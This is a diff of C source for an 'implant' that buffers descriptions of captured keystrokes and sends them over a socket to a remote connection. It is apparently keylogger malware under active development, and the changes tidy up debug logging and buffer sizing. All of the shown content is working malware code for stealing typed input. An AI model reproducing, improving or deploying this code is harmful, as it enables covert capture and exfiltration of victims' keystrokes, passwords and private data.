@@ -5,6 +5,7 @@
 */
 
 
+#include <stddef.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -16,7 +17,7 @@
 #include "implant.h"
 
 
-int send_key_description(int sockfd, char key_desc[STRING_BUFFER_SIZE]) {
+int send_key_description(int sockfd, char *key_desc) {
 
     /*
         creates a standalone buffer of at least 10 * STRING_BUFFER_SIZE,
@@ -26,17 +27,42 @@ int send_key_description(int sockfd, char key_desc[STRING_BUFFER_SIZE]) {
         such that a size_t can hold 10 times its size in nb of characters.
     */
 
-    const size_t max_nb_chars = STRING_BUFFER_SIZE * 10 - 1;
+#ifdef DEBUG
+    /* i dont want to wait that long when testing lol */
+
+    const size_t max_nb_chars = STRING_BUFFER_SIZE;
+    static char tmp_buffer[STRING_BUFFER_SIZE] = { 0 };
+#else
+    const size_t max_nb_chars = STRING_BUFFER_SIZE * 10;
     static char tmp_buffer[STRING_BUFFER_SIZE * 10] = { 0 };
+#endif
+
     static size_t nb_chars_in_buffer = 0;
 
-    size_t length_keydesc = strlen(key_desc);
-    if (max_nb_chars < (nb_chars_in_buffer + length_keydesc)) {
 
+    /* since DEBUG has timeout for keyboard read, we can get empty keys sometimes */
+    size_t length_keydesc = strlen(key_desc);
+    if (length_keydesc == 0) {
+        return SUCCESSFUL;
+    }
+
+#ifdef DEBUG
+            DEBUG_LOG(
+                "buffer: %s [%ld / %ld]",
+                tmp_buffer,
+                nb_chars_in_buffer,
+                max_nb_chars
+            );
+
+            DEBUG_LOG("new key: %s", key_desc);
+#endif
+
+
+    if (max_nb_chars < (nb_chars_in_buffer + length_keydesc)) {
         if (-1 == send(sockfd, tmp_buffer, nb_chars_in_buffer, 0)) {
 
 #ifdef DEBUG
-            perror("send");
+            DEBUG_LOG("send: %s", strerror(errno));
 #endif
             return ERROR;
         }
@@ -46,7 +72,7 @@ int send_key_description(int sockfd, char key_desc[STRING_BUFFER_SIZE]) {
 
         if (NULL == strncpy(tmp_buffer, key_desc, max_nb_chars)) {
 #ifdef DEBUG
-            perror("strncpy send_key_description");
+            DEBUG_LOG("strncpy send_key_description: %s", strerror(errno));
 #endif
             return ERROR;
         }
@@ -55,7 +81,7 @@ int send_key_description(int sockfd, char key_desc[STRING_BUFFER_SIZE]) {
 
         if (NULL == strncat(tmp_buffer, key_desc, max_nb_chars - nb_chars_in_buffer)) {
 #ifdef DEBUG
-            perror("strncat send_key_description");
+            DEBUG_LOG("strncat send_key_description: %s", strerror(errno));
 #endif
             return ERROR;
         }
@@ -112,7 +138,7 @@ int init_remote_connection(implant_t *instance) {
         ) < 0) {
 
 #ifdef DEBUG
-        perror("setsockopt");
+        DEBUG_LOG("setsockopt send_key_description: %s", strerror(errno));
 #endif
 
         close(sockfd);
@@ -122,7 +148,7 @@ int init_remote_connection(implant_t *instance) {
     if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
 
 #ifdef DEBUG
-        perror("setsockopt");
+        DEBUG_LOG("connect: %s", strerror(errno));
 #endif
 
         close(sockfd);
